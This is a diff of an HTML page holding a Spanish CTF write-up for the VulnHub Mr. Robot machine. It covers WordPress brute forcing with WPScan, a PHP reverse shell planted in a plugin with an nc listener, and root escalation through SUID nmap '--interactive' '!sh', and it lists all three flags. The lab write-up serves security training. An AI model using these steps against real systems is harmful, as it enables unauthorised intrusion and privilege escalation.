@@ -156,35 +156,6 @@
       margin-bottom: 1.2rem;
     }
 
-    /* --- BANNER DE CABECERA DEL POST --- */
-    .post-header {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 20px;
-      align-items: center;
-      margin-bottom: 24px;
-      background: #051628;
-      border-radius: 8px;
-      padding: 24px;
-      border: 1px solid rgba(0, 168, 255, .2);
-    }
-    .post-header .left {
-      flex: 1;
-      min-width: 260px;
-    }
-    .post-header .right {
-      flex: 0 0 200px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .post-header .right img {
-      max-width: 100%;
-      height: auto;
-      border-radius: 6px;
-      border: 1px solid rgba(0, 168, 255, .3);
-    }
-
     /* --- BLOQUES DE TERMINAL --- */
     .term-block {
       background: #020b14;
@@ -309,7 +280,6 @@
       .header-content { flex-direction: column; gap: 10px; }
       body { padding-top: 110px; }
       .nav-item { padding: 6px 10px; font-size: .75rem; }
-      .post-header .right { flex: 1; }
       h1 { font-size: 1.6rem; }
     }
     @media (max-width: 480px) {
@@ -341,260 +311,300 @@
 
   <div class="wrap">
 
-    <!-- ENCABEZADO DEL POST -->
-    <div class="post-header">
-      <div class="left">
-        <h1 style="border-left: none; padding-left: 0; margin: 0;">CTF: Mr. Robot (VulnHub)</h1>
-        <p class="subhead" style="margin-top: 4px;">Write‑up completo · José Luis Trigo Calvo</p>
-        <div style="display: flex; flex-wrap: wrap; gap: 12px; margin-top: 8px;">
-          <span style="background: #020b14; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(0,168,255,.2); color: #00a8ff; font-family: 'JetBrains Mono'; font-size: 0.75rem;">#WordPress</span>
-          <span style="background: #020b14; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(0,168,255,.2); color: #00a8ff; font-family: 'JetBrains Mono'; font-size: 0.75rem;">#ReverseShell</span>
-          <span style="background: #020b14; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(0,168,255,.2); color: #00a8ff; font-family: 'JetBrains Mono'; font-size: 0.75rem;">#Escalada</span>
+    <!-- ENCABEZADO DEL POST  -->
+    <div style="background:#051628; border:1px solid rgba(0,168,255,.2); border-radius:8px; padding:24px; margin-bottom:24px;">
+      <div style="display:flex; flex-wrap:wrap; gap:20px; align-items:center;">
+        <div style="flex:1; min-width:260px;">
+          <h1 style="border-left:none; padding-left:0; margin:0;">CTF: Mr. Robot (VulnHub)</h1>
+          <p style="color:#4a75a0; margin:4px 0 8px;">Write‑up completo · José Luis Trigo Calvo</p>
+          <div style="display:flex; flex-wrap:wrap; gap:12px; margin-top:8px;">
+            <span style="background:#020b14; padding:4px 14px; border-radius:20px; border:1px solid rgba(0,168,255,.2); color:#00a8ff; font-family:'JetBrains Mono'; font-size:0.75rem;">#WordPress</span>
+            <span style="background:#020b14; padding:4px 14px; border-radius:20px; border:1px solid rgba(0,168,255,.2); color:#00a8ff; font-family:'JetBrains Mono'; font-size:0.75rem;">#ReverseShell</span>
+            <span style="background:#020b14; padding:4px 14px; border-radius:20px; border:1px solid rgba(0,168,255,.2); color:#00a8ff; font-family:'JetBrains Mono'; font-size:0.75rem;">#Escalada</span>
+          </div>
+        </div>
+        <div style="flex:0 0 180px; display:flex; justify-content:center;">
+          <img src="../../imagenes/mr_robot.png" alt="Mr. Robot CTF" style="max-width:180px; border-radius:6px; border:1px solid rgba(0,168,255,.3);" />
         </div>
       </div>
-      <div class="right">
-        <img src="imagenes/mr_robot.png" alt="Mr. Robot CTF" style="max-width: 180px; border-radius: 6px;" />
+      <!-- Datos del autor en tabla -->
+      <div style="margin-top:20px; border-top:1px solid rgba(0,168,255,.1); padding-top:16px;">
+        <table style="width:auto; background:transparent; border:none; font-size:0.9rem;">
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">Autor</td><td style="padding:4px 0; border:none; color:#e3edf7;">José Luis Trigo Calvo</td></tr>
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">LinkedIn</td><td style="padding:4px 0; border:none;"><a href="https://linkedin.com/in/jltrigoc/" target="_blank">linkedin.com/in/jltrigoc/</a></td></tr>
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">Web</td><td style="padding:4px 0; border:none;"><a href="https://joseltc.github.io/" target="_blank">joseltc.github.io/</a></td></tr>
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">Email</td><td style="padding:4px 0; border:none;"><a href="mailto:jltrigoc01@gmail.com">jltrigoc01@gmail.com</a></td></tr>
+        </table>
       </div>
     </div>
 
+    <!-- CONTENIDO (índice)  -->
+
     <!-- DECLARACIÓN DE USO ÉTICO -->
-    <section style="margin-bottom: 24px;">
-      <h2 style="margin-top: 0;">Declaración de uso ético</h2>
+    <section style="margin-bottom:24px;">
+      <h2>Declaración de uso ético</h2>
       <p>El contenido de este documento refleja el proceso de resolución de un CTF (Capture The Flag) con fines estrictamente educativos. Todas las herramientas y comandos empleados se han utilizado en un entorno controlado y autorizado, como parte de mi formación como ethical hacker. No se ha realizado ninguna actividad ilícita ni se ha atacado ningún sistema real sin consentimiento. El único propósito de este trabajo es el aprendizaje y la mejora de las habilidades en ciberseguridad.</p>
     </section>
 
     <!-- MÁQUINAS UTILIZADAS -->
-    <section style="margin-bottom: 24px;">
+    <section style="margin-bottom:24px;">
       <h2>Máquinas utilizadas</h2>
       <ul>
-        <li><strong>Kali Linux</strong>: <a href="https://www.kali.org/get-kali/#kali-virtual-machines" target="_blank">https://www.kali.org/get-kali/#kali-virtual-machines</a></li>
-        <li><strong>CTF MR Robot</strong>: <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank">https://www.vulnhub.com/entry/mr-robot-1,151/</a></li>
+        <li><strong>Kali Linux</strong> : <a href="https://www.kali.org/get-kali/#kali-virtual-machines" target="_blank">https://www.kali.org/get-kali/#kali-virtual-machines</a></li>
+        <li><strong>CTF MR Robot</strong> : <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank">https://www.vulnhub.com/entry/mr-robot-1,151/</a></li>
       </ul>
     </section>
 
     <!-- RESOLUCIÓN PASO A PASO -->
     <section>
-      <h2>Resolución paso a paso</h2>
+      <h2>RESOLUCIÓN PASO A PASO</h2>
 
       <!-- 1. Reconocimiento -->
-      <h3>1. Reconocimiento de máquinas</h3>
+      <h3>1.- Reconocimiento de máquinas</h3>
       <p>Ambas máquinas se encuentran dentro de una misma interfaz de red.</p>
-      <p>Con el comando <code>ip a</code> comprobamos la IP que ha sido asignada a nuestra máquina Kali Linux. (IP Kali Linux → 192.168.56.101)</p>
-      <p>Con el comando <strong><code>sudo nmap -sn 192.168.56.0/24</code></strong> buscamos la IP de nuestra máquina MR Robot.</p>
+      <p>Con el comando ip a comprobamos la IP que ha sido asignada a nuestra máquina Kali Linux. ( IP Kali Linux -&gt; 192.168.56.101)</p>
+      <p>Con el comando <strong>sudo nmap -sn 192.168.56.0/24</strong> buscamos la IP de nuestra máquina MR Robot.</p>
       <figure>
-        <img src="imagenes/mr-robot1.png" alt="Resultado del escaneo de red con nmap" />
+        <img src="imagenes/mr_robot1.png" alt="Resultado del escaneo de red con nmap" />
         <figcaption>Escaneo de red: IP de MR Robot = 192.168.56.102</figcaption>
       </figure>
-      <p>Ahora procederemos a escanear la máquina Mr Robot más a fondo para saber los servicios que está prestando y en qué puertos. Para ello utilizaremos el comando <strong><code>nmap -sV 192.168.56.102</code></strong>.</p>
+      <p>Ahora procederemos a escanear la máquina Mr Robot más a fondo para saber los servicios que está prestando y en que puertos.</p>
+      <p>Para ello utilizaremos el comando <strong>nmap -sV 192.168.56.102</strong></p>
       <figure>
         <img src="imagenes/mr-robot2.png" alt="Escaneo de puertos con nmap -sV" />
         <figcaption>Puertos abiertos: 22 (ssh), 80 (http), 443 (https)</figcaption>
       </figure>
-      <p>Como vemos, la máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS). Al introducir la IP en el navegador, comprobamos que el servidor web funciona correctamente y nos muestra una página con pistas.</p>
+      <p>Como podemos ver obtenemos que la máquina tiene abiertos los siguientes puertos y está ofreciendo los siguientes servicios:</p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Puerto 22</th><th>ssh</th></tr></thead>
+          <tbody>
+            <tr><td>Puerto 80</td><td>Apache / http</td></tr>
+            <tr><td>Puerto 443</td><td>Apache / Ssl/http</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Como vemos que en el puerto 80 y el 443 hay un servidor Apache con un servidor web.Si introducimos la dirección IP de nuestra maquina MR-Robot podemos ver que está funcionando correctamente y que nos da una serie de comandos que podemos utilizar para buscar información.</p>
       <figure>
-        <img src="imagenes/mr-robot3.png" alt="Página principal del servidor web de MR Robot" />
+        <img src="imagenes/mr-robot3.png" alt="Página principal del servidor web" />
         <figcaption>Página web principal</figcaption>
       </figure>
 
       <!-- 2. Enumeración Web -->
-      <h3>2. Enumeración Web</h3>
-      <p>Ahora que sabemos que hay un servidor web, vamos a realizar un escaneo de enumeración web con Nmap para descubrir directorios y archivos ocultos.</p>
-      <div class="term-block">
-        <span class="prompt">root@kali:~$</span> nmap --script=http-enum.nse -p 80 192.168.56.102
-      </div>
+      <h3>2.-Enumeración Web</h3>
+      <p>Ahora que ya sabemos que hay un servidor web , vamos a realizar un escaneo de enumeración web que usa Nmap para descubrir directorios y archivos ocultos en servidores web.</p>
+      <p>Utilizaremos el comando <strong>nmap --script=http-enum.nse -p 80 192.168.56.102</strong></p>
       <figure>
         <img src="imagenes/mr-robot4.png" alt="Resultado del script http-enum de Nmap" />
         <figcaption>Enumeración con Nmap: se detecta WordPress y archivos como robots.txt</figcaption>
       </figure>
-      <p>Este comando nos da mucha información. Sabemos que estamos ante un sitio WordPress y que el servidor tiene algunos archivos interesantes, como <code>robots.txt</code>.</p>
-      <p>Para complementar, utilizamos <strong>gobuster</strong> para un fuzzing más completo:</p>
-      <div class="term-block">
-        <span class="prompt">root@kali:~$</span> gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt
-      </div>
+      <p>Este comando nos da muchísima información que podemos utilizar para nuestra investigación. Por ejemplo, ya sabemos que nos encontramos ante una página con <strong>wordpress</strong> y podemos ver que el servidor tiene algunos archivos interesantes como es <strong>'robots.txt'</strong>.</p>
+      <p>Los comandos que muestran los archivos de una web no siempre muestran todas las rutas en su totalidad, por eso es interesante utilizar alguna herramienta más para ver si hemos detectado todos los directorios de la página.</p>
+      <p>Para ello hemos utilizado la herramienta gobuster y el siguiente comando <strong>gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt</strong></p>
       <figure>
         <img src="imagenes/mr-robot4_1.png" alt="Resultado de gobuster" />
         <figcaption>Directorio descubiertos con gobuster</figcaption>
       </figure>
-      <p>Entre los hallazgos, el archivo <code>robots.txt</code> nos revela dos archivos:</p>
+      <p>Con este comando la salida en rutas es bastante más clara.</p>
+      <p>Vamos a investigar con los resultados obtenidos.</p>
+      <p>La consulta del archivo robots.txt ha sido todo un logro, pues nos muestra que hay dos archivos:</p>
       <ul>
         <li><strong>fsocity.dic</strong></li>
         <li><strong>key-1-of-3.txt</strong></li>
       </ul>
       <figure>
-        <img src="imagenes/mr-robot4_2.png" alt="Contenido de robots.txt" />
+        <img src="imagenes/mr-robot4_3.png" alt="Contenido de robots.txt" />
         <figcaption>robots.txt muestra los archivos</figcaption>
       </figure>
-      <p>Descargamos ambos con <code>wget</code>:</p>
-      <div class="term-block">
-        <span class="prompt">root@kali:~$</span> wget http://192.168.56.102/key-1-of-3.txt<br>
-        <span class="prompt">root@kali:~$</span> wget http://192.168.56.102/fsocity.dic
-      </div>
-      <p>La primera key es:</p>
-      <div class="term-block" style="border-color: #00a8ff;">
+      <p>Vamos a descargar los archivos y ver que es lo que contienen:</p>
+      <p>Con el comando <strong>wget http://192.168.56.102/key-1-of-3.txt</strong> descargamos el archivo key-1-of-3.txt y al abrirlo vemos que contiene la primera key que estábamos buscando.</p>
+      <div class="term-block" style="border-color:#00a8ff;">
         <span class="highlight">Key 1: 073403c8a58a1f80d943455fb30724b9</span>
       </div>
       <figure>
-        <img src="imagenes/mr-robot4_3.png" alt="Contenido de key-1-of-3.txt" />
+        <img src="imagenes/mr-robot4_4.png" alt="Contenido de key-1-of-3.txt" />
         <figcaption>Primera key encontrada</figcaption>
       </figure>
-      <p>El diccionario <code>fsocity.dic</code> contiene posibles nombres o contraseñas para WordPress.</p>
+      <p>Con el comando <strong>wget http://192.168.56.102/fsocity.dic</strong> descargamos el archivo fsocity.dic y comprobamos que es un diccionario con posibles nombres o contraseñas para acceder a wordpress.</p>
       <figure>
-        <img src="imagenes/mr-robot4_4.png" alt="Vista del diccionario fsocity.dic" />
+        <img src="imagenes/mr-robot5.png" alt="Vista del diccionario fsocity.dic" />
         <figcaption>fsocity.dic: 858.160 líneas</figcaption>
       </figure>
 
-      <!-- 3. Explotación de WordPress -->
-      <h3>3. Explotación de WordPress</h3>
-      <p>Los usuarios y contraseñas comunes no funcionan, así que usaremos el diccionario obtenido.</p>
-      <p>Para reducir el tiempo, eliminamos duplicados:</p>
-      <div class="term-block">
-        <span class="prompt">root@kali:~$</span> wc -l fsocity.dic <span class="comment"># 858160</span><br>
-        <span class="prompt">root@kali:~$</span> sort fsocity.dic | uniq > words.dic<br>
-        <span class="prompt">root@kali:~$</span> wc -l words.dic <span class="comment"># 11451</span>
-      </div>
-      <p>Como es temática, creamos un archivo con nombres de personajes de la serie:</p>
+      <!-- 3. Explotación de Wordpress -->
+      <h3>3.-Explotación de Wordpress</h3>
+      <p>Ya que los usuarios(admin,root) y contraseñas(admin,1234,password) comunes no nos dan acceso a wordpress vamos a utilizar el diccionario que nos han dado para intentar obtener ese acceso.</p>
+
+      <h4>Primera opción:</h4>
+      <p>Con el objetivo de reducir el tiempo de ejecución a la hora de intentar hacer el ataque de fuerza bruta , utilizamos el comando <strong>wc -l fsocity.dic</strong> para saber el numero de palabras que contiene el fichero y el comando <strong>sort fsocity.dic | uniq | wc -l</strong> para quedarnos solo una vez con cada palabra, quitando así las repetidas y reduciendo el tiempo del ataque considerablemente. (Hemos pasado de tener 858160 palabras a 11451).</p>
       <figure>
-        <img src="imagenes/mr-robot5.png" alt="Lista de usuarios potenciales" />
+        <img src="imagenes/mr-robot6.png" alt="Resultado de wc y sort uniq" />
+        <figcaption>Reducción del diccionario</figcaption>
+      </figure>
+      <p>Al ser una máquina temática ( pertenece a la serie mr robot) antes de usar el mismo diccionario para intentar obtener usuario y contraseña( podría llevarnos horas) vamos a formar un archivo con los nombres de los protagonistas de la serie como posible nombre de usuario.</p>
+      <figure>
+        <img src="imagenes/mr-robot7.png" alt="Lista de usuarios potenciales" />
         <figcaption>users.txt con nombres de la serie</figcaption>
       </figure>
-      <p>Lanzamos el ataque de fuerza bruta con <strong>WPScan</strong>:</p>
-      <div class="term-block">
-        <span class="prompt">root@kali:~$</span> wpscan --url http://192.168.56.102 -U users.txt -P words.dic --password-attack wp-login
-      </div>
+      <p>Ahora ya podemos realizar el ataque de fuerza bruta para intentar obtener acceso a wordpress.Para ello utilizaremos el comando <strong>wpscan --url http://192.168.56.102 -U users.txt -P words.dic --password-attack wp-login</strong></p>
       <figure>
-        <img src="imagenes/mr-robot6.png" alt="Resultado de WPScan" />
+        <img src="imagenes/mr-robot8.png" alt="Resultado de WPScan" />
         <figcaption>WPScan encuentra dos usuarios: Elliot y elliot, con la misma contraseña: ER28-0652</figcaption>
       </figure>
-      <p>Probamos con el usuario <strong>Elliot</strong> y accedemos al panel de WordPress.</p>
+      <p>Como podemos ver hemos obtenido dos posibles usuarios:</p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Elliot</th><th>ER28-0652</th></tr></thead>
+          <tbody>
+            <tr><td>elliot</td><td>ER28-0652</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Y tras probar con la primera opción , vemos que ya podemos acceder a wordpress.</p>
       <figure>
-        <img src="imagenes/mr-robot7.png" alt="Acceso al panel de WordPress" />
+        <img src="imagenes/mr-robot9.png" alt="Acceso al panel de WordPress" />
         <figcaption>Dashboard de WordPress</figcaption>
       </figure>
 
-      <p><strong>Segunda opción:</strong> En el directorio <code>/license</code> encontramos una pista adicional.</p>
+      <h4>Segunda opción:</h4>
+      <p>Investigando el resto de los directorios obtenidos con los escaneos, en el directorio License podemos encontrar una pista.</p>
       <figure>
-        <img src="imagenes/mr-robot8.png" alt="Página de licencia" />
+        <img src="imagenes/mr-robot10.png" alt="Página de licencia" />
         <figcaption>Página de licencia</figcaption>
       </figure>
       <figure>
-        <img src="imagenes/mr-robot9.png" alt="Código en base64" />
+        <img src="imagenes/mr-robot11.png" alt="Código en base64" />
         <figcaption>Fragmento codificado en base64</figcaption>
       </figure>
-      <p>Desciframos con:</p>
+      <p>Investigando un poco, podemos ver que ese código está códificado en base 64.</p>
+      <p>Para descifrarlo vamos a utilizar el comando</p>
       <div class="term-block">
         <span class="prompt">root@kali:~$</span> echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
       </div>
       <figure>
-        <img src="imagenes/mr-robot9.png" alt="Resultado del descifrado" />
+        <img src="imagenes/mr-robot12.png" alt="Resultado del descifrado" />
         <figcaption>Usuario: elliot, Contraseña: ER28-0652</figcaption>
       </figure>
+      <p>Y podemos ver que contiene el usuario y la contraseña , que es el mismo que hemos conseguido con el ataque de fuerza bruta.</p>
 
-      <p>Ahora, para obtener una shell reversa, editaremos un plugin de WordPress e insertaremos código PHP de reverse shell (obtenido de <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">pentestmonkey/php-reverse-shell</a>).</p>
+      <p>Ahora llega la parte más interesante, vamos a intentar establecer una shell reversa desde nuestro Kali Linux a la máquina MR Robot usando wordpress con el fin de poder navegar en los directorios propios de la máquina atacada.</p>
+      <p>Para ello debemos introducir código php en uno de los plugins de wordpress.</p>
+      <p>El código que he utilizado para realizar la shell reversa lo he obtenido de <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">https://github.com/pentestmonkey/php-reverse-shell</a>.</p>
+      <p>Seguiremos la ruta Plugins &gt; Installed Plugins y editaremos el código de uno de ellos, donde insertaremos el código de la shell reversa.</p>
       <figure>
-        <img src="imagenes/mr-robot10.png" alt="Editor de plugin con el código de reverse shell" />
+        <img src="imagenes/mr-robot13.png" alt="Editor de plugin con el código de reverse shell" />
         <figcaption>Inserción del código en un plugin</figcaption>
       </figure>
-      <p><strong>Importante:</strong> La IP en el código debe ser la de la máquina atacante (Kali).</p>
-      <p>En una terminal de Kali, abrimos un listener con <code>nc</code>:</p>
+      <p><strong>*Importante : La dirección ip que se introduce en este código es la de la máquina atacante, no la de la máquina atacada.</strong></p>
+      <p>Una vez introducido el código debemos abrir una terminal con el comando <strong>nc</strong></p>
       <div class="term-block">
         <span class="prompt">root@kali:~$</span> nc -lnvp 5555
       </div>
       <figure>
-        <img src="imagenes/mr-robot10.png" alt="Listener netcat" />
+        <img src="imagenes/mr-robot13_1.png" alt="Listener netcat" />
         <figcaption>Listener en puerto 5555</figcaption>
       </figure>
-      <p>Activamos el plugin desde WordPress y obtenemos la shell:</p>
+      <p>Ahora debemos volver a wordpress y activar el plugin en el que hemos introducido el código de la shell reversa.</p>
       <figure>
-        <img src="imagenes/mr-robot11.png" alt="Reverse shell establecida" />
+        <img src="imagenes/mr-robot14.png" alt="Activación del plugin" />
+        <figcaption>Activación del plugin</figcaption>
+      </figure>
+      <p>Al pulsar sobre Activar podemos ver que la terminal donde estábamos escuchando se ha actualizado y que ya tenemos acceso a la máquina.</p>
+      <figure>
+        <img src="imagenes/mr-robot15.png" alt="Reverse shell establecida" />
         <figcaption>Shell conectada</figcaption>
       </figure>
-      <p>Una vez dentro, exploramos el sistema:</p>
-      <div class="term-block">
-        <span class="prompt">www-data@robot:~$</span> pwd<br>
-        <span class="prompt">www-data@robot:~$</span> id<br>
-        <span class="prompt">www-data@robot:~$</span> whoami<br>
-        <span class="prompt">www-data@robot:~$</span> ls -la /home
-      </div>
+      <p>Ahora ya que estamos dentro de la máquina podemos ejecutar una serie de comandos como:</p>
       <figure>
-        <img src="imagenes/mr-robot12.png" alt="Comandos básicos en la shell" />
+        <img src="imagenes/mr-robot16.png" alt="Comandos básicos en la shell" />
         <figcaption>Exploración inicial</figcaption>
       </figure>
-      <p>Encontramos el directorio <code>/home/robot</code> con los archivos <code>key-2-of-3.txt</code> y <code>password.raw-md5</code>.</p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>PWD</th><th>Directorio actual</th></tr></thead>
+          <tbody>
+            <tr><td>ID</td><td>Datos sobre el usuario actual</td></tr>
+            <tr><td>WHOAMI</td><td>Usuario actual</td></tr>
+            <tr><td>LS -LA /HOME</td><td>Directorios home que contiene la máquina</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Podemos ver que la máquina contiene un directorio <strong>home</strong> con nombre <strong>robot.</strong></p>
+      <p>Haremos un cd para entrar en ese directorio y ver lo que contiene.</p>
       <figure>
-        <img src="imagenes/mr-robot13.png" alt="Contenido de /home/robot" />
+        <img src="imagenes/mr-robot17.png" alt="Contenido de /home/robot" />
         <figcaption>Archivos del usuario robot</figcaption>
       </figure>
-      <p>No tenemos permisos para leer <code>key-2-of-3.txt</code>, pero sí podemos ver <code>password.raw-md5</code>:</p>
-      <div class="term-block">
-        <span class="prompt">www-data@robot:/home/robot$</span> cat password.raw-md5
-        <div class="output">robot:abcdefghijklmnopqrstuvwxyz</div>
-      </div>
-      <p>El hash MD5 se descifra fácilmente (por ejemplo, con <a href="https://www.dcode.fr/funcion-hash-md5" target="_blank">dCode.fr</a>) y obtenemos la contraseña: <strong>abcdefghijklmnopqrstuvwxyz</strong>.</p>
+      <p>Como se puede ver en la imagen tenemos un archivo llamado <strong>key-2-of-3.txt</strong> que contiene la segunda key de las 3 que vamos buscando y un archivo password.raw-md5 que suponemos que contendrá la contraseña del usuario robot ,que se encuentra hasheada en md5.</p>
+      <p>Si intentamos ver el contenido del fichero key-2-of-3.txt, podemos comprobar que no tenemos permisos, por lo tanto ,vamos a ver el contenido del archivo password.raw-md5 con el fin de entrar con el usuario robot en el sistema.</p>
       <figure>
-        <img src="imagenes/mr-robot13_1.png" alt="Descifrado MD5" />
+        <img src="imagenes/mr-robot18.png" alt="Contenido de password.raw-md5" />
+        <figcaption>password.raw-md5 muestra el hash</figcaption>
+      </figure>
+      <p>Como en el nombre del fichero indica MD5 vamos a intentar desencriptar el código para encontrar la contraseña. Para ello, utilizaremos la página: <a href="https://www.dcode.fr/funcion-hash-md5" target="_blank">https://www.dcode.fr/funcion-hash-md5</a></p>
+      <p>Y podemos ver que la contraseña es : <strong>abcdefghijklmnopqrstuvwxyz</strong></p>
+      <figure>
+        <img src="imagenes/mr-robot19.png" alt="Descifrado MD5" />
         <figcaption>Contraseña desencriptada</figcaption>
       </figure>
 
-      <!-- 4. Escalada de privilegios -->
-      <h3>4. Escalada de privilegios</h3>
-      <p>Intentamos cambiar al usuario <code>robot</code> con <code>su robot</code>, pero la terminal no permite ejecutar comandos root. Buscamos binarios SUID:</p>
-      <div class="term-block">
-        <span class="prompt">www-data@robot:~$</span> find / -user root -perm -4000 -type f 2>/dev/null
-      </div>
+      <!-- 4. Escalada -->
+      <h3>4.- Escalada de privilegios</h3>
+      <p>Al intentar acceder con el usuario robot , vemos que la terminal no está preparada para ejecutar comandos root.</p>
       <figure>
-        <img src="imagenes/mr-robot14.png" alt="Búsqueda de binarios SUID" />
+        <img src="imagenes/mr-robot20.png" alt="Intento de su robot" />
+        <figcaption>No se puede ejecutar comandos root</figcaption>
+      </figure>
+      <p>Ahora lo que podemos hacer es buscar los binarios SUID, que son archivos ejecutables en sistemas tipo Unix/Linux que tienen un permiso especial que permite al usuario que los ejecuta obtener temporalmente los privilegios del propietario del archivo. Por lo tanto, lo que haremos es ejecutar comandos dentro de estos archivos ejecutables que nos permitirán escalar a root.</p>
+      <p>Utilizaremos el comando <strong>find / -user root -perm -4000 -type f 2&gt;/dev/null</strong></p>
+      <figure>
+        <img src="imagenes/mr-robot21.png" alt="Búsqueda de binarios SUID" />
         <figcaption>Lista de binarios SUID</figcaption>
       </figure>
-      <p>Entre ellos, <strong>nmap</strong> (versión 3.81) es vulnerable a una escalada mediante el modo interactivo. Consultamos <a href="https://medium.com/@abinreji8/interactive-mode-vulnerability-in-nmap-3-81-971ddfd1b27a" target="_blank">este artículo</a>.</p>
-      <p>Ejecutamos:</p>
-      <div class="term-block">
-        <span class="prompt">www-data@robot:~$</span> nmap --interactive<br>
-        <span class="prompt">nmap></span> !sh
-      </div>
-      <p>Una vez dentro, somos <code>root</code>. Podemos leer la segunda key:</p>
-      <div class="term-block">
-        <span class="prompt">root@robot:~#</span> cat /home/robot/key-2-of-3.txt<br>
-        <span class="output">822c73956184f694993bede3eb39f959</span>
+      <p>Usaremos nmap y para ello debemos investigar nmap. Haremos cd /usr/local/bin.</p>
+      <p>Luego comprobaremos que versión de nmap tiene la máquina con nmap --version para ver si es vulnerable.</p>
+      <p>La versión es 3.81 y tras una breve búsqueda en la red podemos encontrar una vulnerabilidad que nos permite escalar privilegios en la shell con el comando ¡sh</p>
+      <p><a href="https://medium.com/@abinreji8/interactive-mode-vulnerability-in-nmap-3-81-971ddfd1b27a" target="_blank">https://medium.com/@abinreji8/interactive-mode-vulnerability-in-nmap-3-81-971ddfd1b27a</a>.</p>
+      <p>Para introducir el comando ¡sh debemos abrir una shell interactiva con el comando nmap --interactive. Una vez ejecutado, con whoami ya podemos ver que somos root. Y además podemos navegar hacia la ruta /home/root donde ya podemos consultar la key 2 con el comando cat.</p>
+      <div class="term-block" style="border-color:#00a8ff;">
+        <span class="highlight">Key 2: 822c73956184f694993bede3eb39f959</span>
       </div>
       <figure>
-        <img src="imagenes/mr-robot15.png" alt="Escalada a root y obtención de key 2" />
+        <img src="imagenes/mr-robot22.png" alt="Escalada a root y obtención de key 2" />
         <figcaption>Key 2 obtenida</figcaption>
       </figure>
-      <p>Buscamos la tercera key con <code>find</code>:</p>
-      <div class="term-block">
-        <span class="prompt">root@robot:~#</span> find /home /var /etc /root -name "key-3-of-3.txt" 2>/dev/null
+      <p>Ahora que ya tenemos privilegios de root , vamos a navegar por las distintas carpetas del sistema . Con ls -la podemos ver toda la estructura de carpetas en / .</p>
+      <p>Investigaremos las marcadas abajo.</p>
+      <figure>
+        <img src="imagenes/mr-robot23.png" alt="Estructura de carpetas en /" />
+        <figcaption>Listado de directorios raíz</figcaption>
+      </figure>
+      <p>Como únicamente nos falta una key y los nombres de las anteriores keys seguían la siguiente estructura 'key-1-of-3.txt' o 'key-2-of-3.txt' vamos a utilizar find sobre las principales carpetas del sistema para ver si damos con 'key-3-of-3.txt' de manera rápida.</p>
+      <p>Para ello utilizaremos el comando <strong>find /home /var /etc /root -name "key-3-of-3.txt" 2&gt;/dev/null .</strong> Y como podemos ver nos devuelve que el archivo 'key-3-of-3.txt' se encuentra en el directorio root y la key es :</p>
+      <div class="term-block" style="border-color:#00a8ff;">
+        <span class="highlight">Key 3: 04787ddef27c3dee1ee161b21670b4e4</span>
       </div>
       <figure>
-        <img src="imagenes/mr-robot16.png" alt="Búsqueda de key 3" />
+        <img src="imagenes/mr-robot24.png" alt="Búsqueda de key 3" />
         <figcaption>La key 3 se encuentra en /root</figcaption>
       </figure>
-      <p>La leemos:</p>
-      <div class="term-block">
-        <span class="prompt">root@robot:~#</span> cat /root/key-3-of-3.txt<br>
-        <span class="output">04787ddef27c3dee1ee161b21670b4e4</span>
-      </div>
 
       <!-- 5. Resultados -->
-      <h3>5. Resultados obtenidos</h3>
+      <h3>5.- Resultados obtenidos:</h3>
       <div class="table-wrap">
         <table>
-          <thead>
-            <tr><th>Key</th><th>Valor</th></tr>
-          </thead>
+          <thead><tr><th><strong>Key 1</strong></th><th>073403c8a58a1f80d943455fb30724b9</th></tr></thead>
           <tbody>
-            <tr><td><strong>Key 1</strong></td><td>073403c8a58a1f80d943455fb30724b9</td></tr>
             <tr><td><strong>Key 2</strong></td><td>822c73956184f694993bede3eb39f959</td></tr>
             <tr><td><strong>Key 3</strong></td><td>04787ddef27c3dee1ee161b21670b4e4</td></tr>
           </tbody>
         </table>
       </div>
 
-      <h3>Herramientas utilizadas</h3>
+      <h3>Herramientas utilizadas:</h3>
       <div class="table-wrap">
         <table>
-          <thead>
-            <tr><th>Herramienta</th><th>Uso</th></tr>
-          </thead>
+          <thead><tr><th><strong>Herramienta</strong></th><th><strong>Uso</strong></th></tr></thead>
           <tbody>
             <tr><td>Nmap</td><td>Descubrimiento de hosts y escaneo de puertos</td></tr>
             <tr><td>Gobuster</td><td>Fuzzing de directorios web</td></tr>
@@ -606,16 +616,17 @@
       </div>
 
       <h3>Conclusión</h3>
-      <p>La resolución de la máquina MR Robot me ha permitido poner en práctica técnicas fundamentales de ciberseguridad ofensiva:</p>
+      <p>La resolución de la máquina MR Robot me ha permitido poner en práctica</p>
+      <p>técnicas fundamentales de ciberseguridad ofensiva:</p>
       <ul>
-        <li>Enumeración web para descubrir recursos ocultos (<code>robots.txt</code>, <code>fsocity.dic</code>)</li>
+        <li>Enumeración web para descubrir recursos ocultos ('robots.txt', 'fsocity.dic')</li>
         <li>Ataque de fuerza bruta con WPScan para obtener credenciales</li>
         <li>Reverse Shell mediante inyección de código PHP en WordPress</li>
         <li>Escalada de privilegios aprovechando binarios SUID vulnerables (nmap 3.81)</li>
       </ul>
 
       <!-- Botón de volver al portfolio -->
-      <div style="margin-top: 30px; text-align: center;">
+      <div style="margin-top:30px; text-align:center;">
         <a href="../../index.html#proyectos" class="btn-back">← Volver al portfolio</a>
       </div>
 
